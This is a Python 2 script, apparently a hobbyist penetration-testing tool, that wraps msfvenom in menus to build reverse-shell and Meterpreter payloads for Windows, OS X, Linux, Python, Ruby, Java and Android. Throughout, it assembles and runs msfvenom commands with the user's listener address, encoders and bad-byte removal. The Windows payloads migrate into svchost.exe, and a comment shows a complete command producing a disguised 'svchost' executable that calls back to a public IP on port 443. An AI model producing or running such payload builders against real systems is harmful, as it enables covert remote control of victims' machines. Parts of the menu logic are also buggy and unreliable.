#Startup Module Imports
import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

os.system('cat /root/ArmsCommander/banner_EZPZ.txt')
print colored('Easy-Peasey, the MSFVenom Payload Generator Targeting All Available Platforms by Chang Tan Lister','red','on_white')
#General Main Menu Layout
#Platform
#Architecture (Preferably 32 bit since x64 is troublesome)
#Type, Inline or Staged
#protocol
#LHOST and LPORT
#Encoder
##We should make a cat command to explain to user what LHOST and LPORT means behind a NATed network
##We should also warn the user to use a remote Amazon AWS server as the listener
##After payload generation, explain to user what commands to use to setup listener and port forwarding policies

#Disclaimer Notice
#use cat command on the wall of text
#A STAGED reverse handler can be used for both STAGED and STAGELESS
#Sometimes a encoder won't work Be sure to print out a list of encoders
#Ask user for iterations to encode, warn them that more iterations increases the size

#Define a class for the common msfvenom parameters
    #LHOST and
    #LPORT
    #Encoder
    #Encoder iterations
    #Output location
class payload_Parameters(object):
    def __init__(self, LHOST, LPORT, encoder, encoder_iterations, output_format, output_payload):
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.encoder = encoder
        self.encoder_iterations = encoder_iterations
        self.output_format = output_format
        self.output_payload = output_payload
    @classmethod
    def from_input(cls):
        return cls(
            str(raw_input("Enter LHOST, your PUBLIC IP Address: ")),
            str(raw_input("Enter LPORT, your LISTENER PORT: ")),
            str(raw_input("Enter the type of encoder, choose from the list: ")),
            str(raw_input("Enter the number of iterations, usually from 1 to 5: ")),
            str(raw_input("Enter the format of your output, like 'raw' or 'exe': ")),
            str(raw_input("Enter the full path of your output file: "))
        )
#Main Menu
#1. Windows Reverse Shells
    #a. Inline/Stageless
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
    #b. Staged
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
#2. Linux Reverse Shells
        #1. Linux Meterpreter Reverse TCP, Staged
#3. Mac Reverse Shells (OSX)
        ##Warn users that OSX Shells are INLINE-Only
        #1. PowerPC Processor
        #2. x86 Processor
#4. Python Reverse Shells
    #a. INLINE
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
    #b. Staged
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS

#5. Ruby Reverse Shells
    ##INLINE ONLY
        #1. Reverse TCP Command Shells
        #2. Reverse TCP SSL Command Shell
#6. Java Reverse Shells
    #STAGED payloads ONLY
        #1. Reverse Meterpreter TCP
        #2. Reverse Meterpreter HTTP
        #3. Reverse Meterpreter HTTPS
#7. Android Reverse Shells
    #INLINE
        #1. Reverse Meterpreter TCP
        #2. Reverse Meterpreter HTTP
        #3. Reverse Meterpreter HTTPS
    #STAGED
        #1. Reverse Meterpreter TCP
        #2. Reverse Meterpreter HTTP
        #3. Reverse Meterpreter HTTPS

#Make a dictionary file for encoders
def Windows_INLINE():
        opt_Dict = {
            '1': 'windows/meterpreter_reverse_tcp',
            '2': 'windows/meterpreter_reverse_http',
            '3': 'windows/meterpreter_reverse_https'
        }
        opt_List = (
            '\n\t#1. Windows Meterpreter, Reverse TCP Shell',
            '#2. Windows Meterpreter, Reverse HTTP Shell',
            '#3. Windows Meterpreter, Reverse HTTPS Shell'
        )
        print ("\n\t".join(opt_List))
        opt_Choice = str(raw_input("Enter a payload shown: "))

        if opt_Choice in opt_Dict:
            os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
            print colored('Please answer the following questions','red','on_white')
            payload_Set = opt_Dict[opt_Choice]
            user_input = payload_Parameters.from_input()
            bad_Bytes = "x00"
            cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                payload_Set,
                user_input.LHOST,
                user_input.LPORT,
                user_input.encoder,
                user_input.encoder_iterations,
                bad_Bytes,
                user_input.output_format,
                user_input.output_payload
            )
            print colored(cmd_String,'red','on_white')
            os.system(cmd_String)
        else:
            print colored('You have entered a invalid option','red','on_white')
            Windows_STAGED()
        main()
    #a. Inline/Stageless
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
def Windows_STAGED():
        opt_Dict = {
            '1': 'windows/meterpreter/reverse_tcp',
            '2': 'windows/meterpreter/reverse_http',
            '3': 'windows/meterpreter/reverse_https'
        }

        opt_List = (
            '\n\t#1. Windows Meterpreter, Reverse TCP Shell',
            '#2. Windows Meterpreter, Reverse HTTP Shell',
            '#3. Windows Meterpreter, Reverse HTTPS Shell'
        )
        print ("\n\t".join(opt_List))
        opt_Choice = str(raw_input("Enter a payload shown: "))

        if opt_Choice in opt_Dict:
            os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
            print colored('Please answer the following questions','red','on_white')
            payload_Set = opt_Dict[opt_Choice]
            user_input = payload_Parameters.from_input()
            bad_Bytes = "x00"
            cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} PrependMigrate=true PrependMigrateProc=svchost.exe -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
                payload_Set,
                user_input.LHOST,
                user_input.LPORT,
                user_input.encoder,
                user_input.encoder_iterations,
                bad_Bytes,
                user_input.output_format,
                user_input.output_payload
            )
            print colored(cmd_String,'red','on_white')
            os.system(cmd_String)
        else:
            print colored('You have entered a invalid option','red','on_white')
            Windows_STAGED()
        main()
    #b. Staged
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
# msfvenom -p windows/meterpreter/reverse_https LHOST=52.53.180.45 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe -e x86/alpha_upper -i 5 -b "\x00" -f exe -o svchost_alpha_upper_staged.exe
def Platform_Windows():
    opt_List = [
        '#0. Return to Main Menu',
        '#1. INLINE/STAGELESS Payloads',
        '#2. STAGED Payloads'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION:"))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        Windows_INLINE()
    elif opt_Choice == "2":
        Windows_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Windows()
    return

def OSX_PPC():

    opt_Dict = {
        '1': 'osx/ppc/shell/reverse_tcp',
        '2': 'osx/ppc/shell_reverse_tcp',
    }

    opt_List = (
            '\n\t#1. PowerPC Command Shell STAGED',
            '#2. PowerPC Command Shell INLINE'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        OSX_PPC()
    main()
    return
def OSX_x86():
    opt_Dict = {
        '1': 'osx/x86/shell_reverse_tcp',
        '2': 'osx/x86/vforkshell_reverse_tcp',
        '3': 'osx/x86/vforkshell/reverse_tcp'
    }

    opt_List = (
        '\n\t#1. x86/x64 Command Shell Reverse TCP, INLINE',
        '#2. x86/x64 V-Fork Command Shell, Reverse TCP, INLINE',
        '#3. x86/x64 V-Fork Command Shell, Reverse TCP, STAGED'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        OSX_x86()
    main()
    return
#3. Mac Reverse Shells (OSX)
        ##Warn users that OSX Shells are INLINE-Only
        #1. PowerPC Processor
        #2. x86 Processor

def Platform_OSX():
    print colored('Mac OSX Shells are COMMAND-SHELL ONLY (No Meterpreter RATs), but you also have to pick what processor architecture you are targeting','red','on_white')
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Mac OSX PowerPC',
        '#2. Mac OSX x86'
    ]


    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Select a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        OSX_PPC()
    elif opt_Choice == "2":
        OSX_x86()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
    return

def Linux_STAGED():
#2. Linux Reverse Shells
        #1. Linux Meterpreter Reverse TCP, Staged

    opt_Dict = {
        '1': 'linux/x86/meterpreter/reverse_tcp'
    }

    opt_Choice = str(raw_input("Press 1 to create a reverse meterpreter TCP payload: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        Linux_STAGED()
    main()
    return
def Platform_Linux():
    print colored('Only staged payloads are available for Linux, press 1 to continue','red','on_white')
    opt_Choice = str(raw_input("Press 1 to CONTINUE: "))
    if opt_Choice == "1":
        Linux_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
    return

def Python_INLINE():
    opt_Dict = {
        '1': 'python/meterpreter_reverse_tcp',
        '2': 'python/meterpreter_reverse_http',
        '3': 'python/meterpreter_reverse_https'
    }

    opt_List = (
        '\n\t#1. Python Meterpreter Reverse TCP',
        '#2. Python Meterpreter Reverse HTTP',
        '#3. Python Meterpreter Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        Python_INLINE()
    main()
    return
def Python_STAGED():
    opt_Dict = {
        '1': 'python/meterpreter/reverse_tcp',
        '2': 'python/meterpreter/reverse_http',
        '3': 'python/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Python Meterpreter Reverse TCP',
        '#2. Python Meterpreter Reverse HTTP',
        '#3. Python Meterpreter Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        Python_STAGED()
    main()
    return

def Platform_Python():
    opt_List = [
        '\n\t#1. Python INLINE Reverse Meterpreter Shells',
        '#2. Python STAGED Reverse Meterpreter Shells'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        return
    elif opt_Choice == "2":
        return
    elif opt_Choice == "0":
        main()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Python()
#4. Python Reverse Shells
    #a. INLINE
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
    #b. Staged
        #1. Meterpreter Reverse TCP
        #2. Meterpreter Reverse HTTP
        #3. Meterpreter Reverse HTTPS
    return

def Ruby_INLINE():
    opt_Dict = {
        '1': 'ruby/shell_reverse_tcp',
        '2': 'ruby/shell_reverse_tcp_ssl'
    }

    opt_List = {
        '\n\t#1. Ruby Reverse COMMAND Shell, TCP',
        '#2. Ruby Reverse COMMAND Shell, TCP + SSL'
    }
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        Ruby_INLINE()
    main()
    return
def Platform_Ruby():
#5. Ruby Reverse Shells
    ##INLINE ONLY
        #1. Reverse TCP Command Shells
        #2. Reverse TCP SSL Command Shell
    print colored('Ruby Shells are both INLINE-ONLY and are COMMAND SHELLS (No Meterpreter)','red','on_white')
    Ruby_INLINE()
    return

def Java_STAGED():
    opt_Dict = {
        '1': 'java/meterpreter/reverse_tcp',
        '2': 'java/meterpreter/reverse_http',
        '3': 'java/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Java Reverse Meterpreter, TCP',
        '#2. Java Reverse Meterpreter, HTTP',
        '#3. Java Reverse Meterpreter, HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        Java_STAGED()
    main()
    return
def Platform_Java():
    print colored('Java Meterpreter Shells are STAGED ONLY','red','on_white')
    Java_STAGED()

    return

def Android_INLINE():
    opt_Dict = {
        '1': 'android/meterpreter_reverse_tcp ',
        '2': 'android/meterpreter_reverse_http',
        '3': 'android/meterpreter_reverse_https'
    }

    opt_List = (
        '\n\t#1. Android APK Meterpreter Shell, Reverse TCP',
        '#2. Android APK Meterpreter Shell, Reverse HTTP',
        '#3. Android APK Meterpreter Shell, Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        Android_INLINE()
    main()
    return
def Android_STAGED():
    opt_Dict = {
        '1': 'android/meterpreter/reverse_tcp ',
        '2': 'android/meterpreter/reverse_http',
        '3': 'android/meterpreter/reverse_https'
    }

    opt_List = (
        '\n\t#1. Android APK Meterpreter Shell, Reverse TCP',
        '#2. Android APK Meterpreter Shell, Reverse HTTP',
        '#3. Android APK Meterpreter Shell, Reverse HTTPS'
    )
    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a payload shown: "))

    if opt_Choice in opt_Dict:
        os.system('cat /root/ArmsCommander/msfvenom_encoders.txt')
        print colored('Please answer the following questions','red','on_white')
        payload_Set = opt_Dict[opt_Choice]
        user_input = payload_Parameters.from_input()
        bad_Bytes = "x00"
        cmd_String = """msfvenom -p {0} LHOST={1} LPORT={2} -e {3} -i {4} -b "\{5}" -f {6} -o {7}""".format(
            payload_Set,
            user_input.LHOST,
            user_input.LPORT,
            user_input.encoder,
            user_input.encoder_iterations,
            bad_Bytes,
            user_input.output_format,
            user_input.output_payload
        )
        print colored(cmd_String,'red','on_white')
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        Android_STAGED()
    main()
    return
def Platform_Android():
    opt_List = [
    '\n\t#0. Return to Main Menu',
    '#1. Android INLINE Meterpreter Reverse Shells',
    '#2. Android STAGED Meterpreter Reverse Shells'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        Android_INLINE()
    elif opt_Choice == "2":
        Android_STAGED()
    else:
        print colored('You have entered a invalid option','red','on_white')
        Platform_Android()
    return
def main():
    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Windows Reverse Shells',
        '#2. Mac OSX Reverse Shells',
        '#3. Linux Reverse Shells',
        '#4. Python Reverse Shells',
        '#5. Ruby Reverse Shells',
        '#6. Java Reverse Shells',
        '#7. Android Reverse Shells',
        '#HELP. How to troubleshoot Reverse Shells in personal NATed networks'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Choose a PAYLOAD or type HELP: "))

    if opt_Choice == "1":
        os.system('clear')
        Platform_Windows()
    elif opt_Choice == "2":
        os.system('clear')
        Platform_OSX()
    elif opt_Choice == "3":
        os.system('clear')
        Platform_Linux()
    elif opt_Choice == "4":
        os.system('clear')
        Platform_Python()
    elif opt_Choice == "5":
        os.system('clear')
        Platform_Ruby()
        return
    elif opt_Choice == "6":
        os.system('clear')
        Platform_Java()
        return
    elif opt_Choice == "7":
        os.system('clear')
        Platform_Android()
        return
    elif opt_Choice == "HELP":
        os.system('clear')
        os.system('cat EZPZ_HowTo.txt')
        main()
    elif opt_Choice == "0":
        main()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
#if elif, and else statements go here
    return
main()
